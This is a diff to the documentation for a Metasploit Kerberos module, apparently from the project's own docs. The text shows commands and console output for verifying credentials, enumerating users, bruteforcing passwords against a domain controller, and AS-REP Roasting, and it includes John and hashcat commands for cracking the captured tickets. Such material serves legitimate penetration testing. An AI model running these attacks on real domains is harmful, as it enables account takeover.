@@ -1,28 +1,23 @@
-## Vulnerable Application
+## Kerberos Login/Bruteforce
 
-This module will test Kerberos logins on a range of machines and
-report successful logins.  If you have loaded a database plugin
+The `auxiliary/scanner/kerberos/kerberos_login` module can verify Kerberos credentials against a range of machines and
+report successful logins. If you have loaded a database plugin
 and connected to a database this module will record successful
 logins and hosts so you can track your access.
 
 Kerberos accounts which do not require pre-authentication will
-have the TGT logged, this technique is known as AS-REP Roasting.
+have the TGT logged for offline cracking, this technique is known as AS-REP Roasting.
 
-It is also able to identify whether user accounts are enabled or disabled/locked out.
+This module is able to identify the following information from the KDC: 
 
-## Verification Steps
-
-When verifying the module in the listed examples, it is recommended to test the following accounts:
-
-- Valid account
-- Invalid account
-- Locked/Disabled account
-- Account with spaces
+- Valid/Invalid accounts
+- Locked/Disabled accounts
+- Accounts with expired passwords, when the password matches
 - AS-REP Roastable accounts
 
 ## Target
 
-To use kerberos_login, make sure you are able to connect to the
+To use the `kerberos_login` module, make sure you are able to connect to the
 Kerberos service on a Domain Controller.
 
 ## Scenarios
@@ -34,7 +29,7 @@ To create a single Kerberos ticket (TGT), set the username and password options:
 ```
 msf6 auxiliary(scanner/kerberos/kerberos_login) > run rhost=192.168.123.133 domain=DEMO.local username=basic_user password=password verbose=true
 [*] Using domain: DEMO.LOCAL - 192.168.123.133:88   ...
-[+] 192.168.123.133 - User found: "basic_user" with password password. Hash: $krb5asrep$23$basic_user@DEMO.LOCAL:96d685b85a51e26dbc762c4aa7754d77$ded0e24ef0cef8ffa214cb9c9667ae90d80def77f91c3297be549aab9f4a1235997f3dd8dd70a970838085f94dcb4ec3620232e8c6fc9b192626cc18638f6909dbd582a59e096eb933f9796f869334c1f3bb1440d93484b1870eb626aa6a57801e7a950b6b9839a49f290487e21f5524958006ceb30dad63e88441fb7e49d7b1d81213b022c5b664cf6b93f8f60f0d074a32c11b75878431949dd3d75bcf824f154ef5d6e25036175524a7fac08df5f4be9720ce323dd92973ea3cd8566b85fa57293d15583b0382a587ca660696a85430fa06019d5e42f6650f14c6b74bfdb7450a74045f233a
+[+] 192.168.123.133 - User found: "basic_user" with password password
 [*] Auxiliary module execution completed
 ```
 
@@ -47,7 +42,7 @@ accounts and additionally bruteforcing passwords:
 Create a new `./users.txt` file and `./wordlist.txt`, then run the module:
 
 ```
-msf6 auxiliary(gather/kerberos_enumusers) > rerun rhost=192.168.123.133 domain=DEMO.local user_file=./users.txt pass_file=./wordlist.txt verbose=true
+msf6 auxiliary(gather/kerberos_enumusers) > run rhost=192.168.123.133 domain=DEMO.local user_file=./users.txt pass_file=./wordlist.txt verbose=true
 [*] Reloading module...
 
 [*] Using domain: DEMO.LOCAL - 192.168.123.133:88   ...
@@ -74,8 +69,8 @@ msf6 auxiliary(gather/kerberos_enumusers) > rerun rhost=192.168.123.133 domain=D
 
 ### ASREPRoast Cracking
 
-Accounts that have `Do not require Kerberos preauthentication` enabled, will receive an ASREP response with a ticket present.
-The technique of cracking this token offline is called ASREPRoasting.
+Accounts that have `Do not require Kerberos preauthentication` enabled, will receive an ASREP response with a ticket-granting-ticket present.
+The technique of cracking this ticket offline is called ASREPRoasting.
 
 Cracking ASREP response with John:
 
@@ -89,7 +84,7 @@ Cracking ASREP response with Hashcat:
 hashcat -m 18200 -a 0 ./hashes.txt ./wordlist.txt
 ```
 
-You can see previously creds with:
+You can see previously cracked creds with:
 
 ```
 creds -v
